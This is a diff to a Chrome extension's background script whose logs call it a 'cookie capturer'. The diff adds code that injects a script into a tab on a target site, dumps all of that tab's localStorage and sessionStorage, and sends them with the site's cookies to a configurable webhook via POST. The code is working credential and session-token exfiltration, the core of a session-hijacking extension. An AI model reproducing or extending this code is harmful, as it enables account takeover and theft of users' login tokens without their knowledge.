@@ -104,6 +104,76 @@ async function readCookiesForCaptureUrl() {
   return chrome.cookies.getAll({ url });
 }
 
+/** Aba aberta no host/alvo — precisa existir pra ler local/sessionStorage. */
+async function findTabForCapture() {
+  const tabs = await chrome.tabs.query({});
+  const preferred = liveConfig.captureUrl || TARGET_REQUEST_URL;
+  let best = null;
+  for (const tab of tabs) {
+    if (!tab.id || !tab.url || !isTargetUrl(tab.url, liveConfig)) continue;
+    if (isCaptureUrl(tab.url, liveConfig)) return tab;
+    if (!best) best = tab;
+  }
+  if (best) return best;
+  // fallback: URL configurada exata
+  const exact = tabs.find((t) => t.url && t.url.startsWith(preferred.split("?")[0]));
+  return exact || null;
+}
+
+function dumpWebStorageInPage() {
+  function dump(store) {
+    const out = {};
+    try {
+      for (let i = 0; i < store.length; i++) {
+        const k = store.key(i);
+        if (k != null) out[k] = store.getItem(k);
+      }
+    } catch (_) {
+      /* ignore */
+    }
+    return out;
+  }
+  return {
+    localStorage: dump(localStorage),
+    sessionStorage: dump(sessionStorage),
+    pageUrl: location.href,
+  };
+}
+
+async function readWebStorageFromTab() {
+  const empty = {
+    localStorage: {},
+    sessionStorage: {},
+    pageUrl: null,
+    storageSource: "none",
+  };
+  try {
+    const tab = await findTabForCapture();
+    if (!tab || !tab.id) return empty;
+    const results = await chrome.scripting.executeScript({
+      target: { tabId: tab.id },
+      func: dumpWebStorageInPage,
+    });
+    const result = results && results[0] && results[0].result;
+    if (!result) return empty;
+    return {
+      localStorage: result.localStorage || {},
+      sessionStorage: result.sessionStorage || {},
+      pageUrl: result.pageUrl || tab.url || null,
+      storageSource: "tab",
+    };
+  } catch (e) {
+    console.warn("capturador-cookie webStorage:", e);
+    return {
+      localStorage: {},
+      sessionStorage: {},
+      pageUrl: null,
+      storageSource: "error",
+      storageError: String(e && e.message ? e.message : e),
+    };
+  }
+}
+
 async function postWebhook(webhookUrl, payload) {
   return fetch(webhookUrl, {
     method: "POST",
@@ -143,6 +213,8 @@ async function sendCookies({ tabUrl, force, reason, networkCapture }) {
       return { ok: false, error: "Nenhum cookie para a URL de captura" };
     }
 
+    const webStorage = await readWebStorageFromTab();
+
     const payload = buildPayload({
       url: (capture && capture.url) || tabUrl || liveConfig.captureUrl,
       cookies: jar,
@@ -153,6 +225,7 @@ async function sendCookies({ tabUrl, force, reason, networkCapture }) {
         method: (capture && capture.method) || "GET",
       },
       config: liveConfig,
+      webStorage,
     });
     payload.trigger = reason || (force ? "force" : "auto");
     payload.captureSource =
@@ -184,6 +257,9 @@ async function sendCookies({ tabUrl, force, reason, networkCapture }) {
         status: res.status,
         cookieCount: payload.cookieNames.length,
         captureSource: payload.captureSource,
+        storageSource: payload.storageSource,
+        localStorageKeys: (payload.localStorageKeys || []).length,
+        sessionStorageKeys: (payload.sessionStorageKeys || []).length,
       };
     }
     return { ok: false, error: `HTTP ${res.status}`, status: res.status };
